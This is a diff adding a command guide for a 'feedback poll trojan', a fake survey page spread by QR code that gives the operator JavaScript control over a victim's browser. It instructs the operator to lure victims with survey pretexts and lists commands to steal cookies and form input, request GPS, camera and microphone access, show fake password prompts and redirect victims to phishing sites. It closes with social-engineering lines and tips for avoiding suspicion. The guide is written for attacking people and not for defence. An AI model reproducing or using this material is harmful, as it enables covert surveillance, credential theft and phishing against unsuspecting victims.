@@ -1,0 +1,127 @@
+FEEDBACK POLL TROJAN - COMMAND GUIDE
+====================================
+
+🎯 SETUP COMPLETE:
+- Portal running on: http://192.168.86.21:8090
+- Clean, minimal poll interface (no emojis)
+- QR code ready to share
+- One click = instant trojan access
+
+📱 QR CODE TO SHARE:
+█████████████████████████████████
+█████████████████████████████████
+████ ▄▄▄▄▄ █   █▄ ▄▀ █ ▄▄▄▄▄ ████
+████ █   █ █ ▀▄ ██████ █   █ ████
+████ █▄▄▄█ █▀██▀▀  ▀▄█ █▄▄▄█ ████
+████▄▄▄▄▄▄▄█▄▀▄█ █ █ █▄▄▄▄▄▄▄████
+████ ▄█▀▄▄▄█▀▀▀▄▀▀ ██▀▀▄▀ ▄ ▄████
+██████▄██ ▄ ▄█▀ ▄██▄▄█ ▀▄▄ ▀█████
+████ ▀██  ▄▀▀█▄█▄▀ ▄▀▀█  ▄▄ ▄████
+██████ ▀█▀▄█ ▄██▀██ ▄▄██▄  ▀█████
+████▄▄████▄▄ ▀ ▄▀▄ ▀ ▄▄▄ █▄██████
+████ ▄▄▄▄▄ █▀ █ ▄██▄ █▄█  ▄▀█████
+████ █   █ █▄ ▄█▄ █▄ ▄▄▄▄▀ ▄ ████
+████ █▄▄▄█ █▀▄██▀██▀█▀█  ██ █████
+████▄▄▄▄▄▄▄█▄▄█▄▄▄▄▄▄█▄▄█▄█▄▄▄████
+█████████████████████████████████
+
+💻 HOW TO USE:
+1. Show victim the QR code: "Quick survey for feedback"
+2. Victim scans → sees clean poll interface
+3. Victim clicks any rating (1-5) 
+4. Trojan activates → you get command prompt
+5. Victim sees "Thank you" message while you control their browser
+
+🚀 COMMAND EXAMPLES:
+
+=== BASIC INFORMATION ===
+info                    # Get victim info (URL, user agent)
+document.cookie         # Get all cookies
+window.location.href    # Get current page URL
+navigator.userAgent     # Get browser details
+
+=== LOCATION ACCESS ===
+location                # Get GPS coordinates
+gps                     # Same as location
+
+=== CAMERA ACCESS ===
+camera                  # Request camera permission
+webcam                  # Same as camera
+
+=== MICROPHONE ACCESS ===
+microphone              # Request microphone permission
+mic                     # Same as microphone
+
+=== REDIRECT VICTIM ===
+redirect:https://google.com              # Redirect to Google
+redirect:https://malicious-site.com      # Redirect to any site
+redirect:data:text/html,<h1>Hacked</h1>  # Show custom HTML
+
+=== POPUP MESSAGES ===
+alert('Hello victim!')           # Show popup message
+alert('Your system is infected') # Fake warning popup
+prompt('Enter password:')        # Request password input
+
+=== ADVANCED JAVASCRIPT ===
+document.title = "HACKED"        # Change page title
+history.back()                   # Go back in browser
+window.close()                   # Try to close window
+screen.width                     # Get screen resolution
+
+=== COOKIE MANIPULATION ===
+document.cookie = "hacked=true"  # Set cookie
+document.cookie                  # Read all cookies
+
+=== FORM DATA THEFT ===
+document.forms[0].elements[0].value      # Get form input values
+document.querySelector('input').value    # Get specific input
+
+=== PAGE MANIPULATION ===
+document.body.innerHTML = "<h1>COMPROMISED</h1>"  # Replace page content
+document.body.style.background = "red"            # Change background
+
+📋 TYPICAL SESSION WORKFLOW:
+
+1. Victim clicks rating → trojan activates
+   Output: "[+] POLL TROJAN ACTIVATED!"
+
+2. Get basic info:
+   Poll-Trojan[192.168.1.100] > info
+   Result: URL: http://192.168.86.21:8090, UA: Mozilla/5.0...
+
+3. Get their location:
+   Poll-Trojan[192.168.1.100] > location  
+   Result: GPS: 37.7749,-122.4194
+
+4. Access their camera:
+   Poll-Trojan[192.168.1.100] > camera
+   Result: Camera access granted
+
+5. Redirect them:
+   Poll-Trojan[192.168.1.100] > redirect:https://youtube.com
+   Result: Redirecting to: https://youtube.com
+
+⚠️ IMPORTANT NOTES:
+
+- Commands are JavaScript executed in victim's browser
+- Some features require victim permission (camera, location)
+- Use 'exit' or 'quit' to end session
+- Victim sees "Thank you for feedback" while you work
+- Clean, professional appearance = higher success rate
+- No suspicious forms or downloads needed
+
+🎯 SOCIAL ENGINEERING APPROACHES:
+
+"Quick feedback survey for our new app"
+"Rate our customer service experience"  
+"Help us improve our website - 30 seconds"
+"Anonymous feedback poll for TechCorp"
+"Quality assurance survey - scan to start"
+
+💡 PRO TIPS:
+
+- Use 'info' command first to see what you're working with
+- Try 'location' early - many users allow this
+- Camera/microphone require more convincing but work if granted
+- Redirect is powerful for phishing or further exploitation
+- Keep sessions short to avoid suspicion
